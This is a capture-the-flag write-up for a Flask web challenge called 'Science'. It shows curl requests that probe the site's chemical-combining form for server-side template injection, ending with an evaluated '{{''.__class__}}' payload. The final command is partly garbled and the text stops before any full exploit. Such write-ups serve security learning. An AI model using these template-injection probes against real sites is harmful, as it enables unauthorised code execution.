# Science
Web, 325 points
## Description:
A link to a website was attached.
```html
    Welcome to my new FaaS! (Flask as a Service)
    Please enter the two chemicals you would like to combine:
        Chemical One: 
        Chemical Two: 
```
## Solution:
The website included a form which allowed combining two chemicals (freetext).
The result was a page which pretty much included a GIF:
```console
root@kali:/media/sf_CTFs/tamu/Science# curl "http://web3.tamuctf.com/science" -X POST --data "chem1=a&chem2=b"
        The result of combining a and b is:
```
The title mentioned Flask, and a common vulnerability for Flask sites is "template injection" - we input python code encapsulated in double curly brackets and it gets executed by the template manager.
In many cases the Python runtime environment is sandboxed, so this won't work:
```console
root@kali:/media/sf_CTFs/tamu/Science# curl "http://web3.tamuctf.com/science" -X POST --data "chem1={{print(1)}}&chem2=b"
Something went wrong
```
But this will:
```console
root@kali:/media/sf_CTFs/tamu/Science# curl "http://web3.tamuctf.co-data "chem1={{''.__class__}}&chem2=b"
        The result of combining &lt;type &#39;str&#39;&gt; and b is: